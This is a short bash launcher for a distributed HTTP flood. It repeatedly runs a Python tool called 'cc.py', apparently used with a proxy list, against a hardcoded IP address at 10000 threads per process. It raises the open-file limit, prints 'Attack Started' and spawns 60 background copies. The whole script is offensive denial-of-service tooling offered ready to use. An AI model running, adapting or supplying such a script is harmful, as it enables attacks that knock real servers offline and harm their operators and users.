#!/bin/bash
#
#  Please prepared proxies list at first.
#  And then change the command in atk_cmd
#  And change the process number
#  Lastly run this script
#
#the command you want to exec
atk_cmd="python3 cc.py -url http://88.198.18.78 -v 4 -s 120 -t 10000"

#number of process that you want
process=60

#change the system limit
ulimit -n 999999
echo 
echo Attack Started
for ((i=1;i<=$process;i++))
do
  $atk_cmd >/dev/null &
  sleep 0.1
done
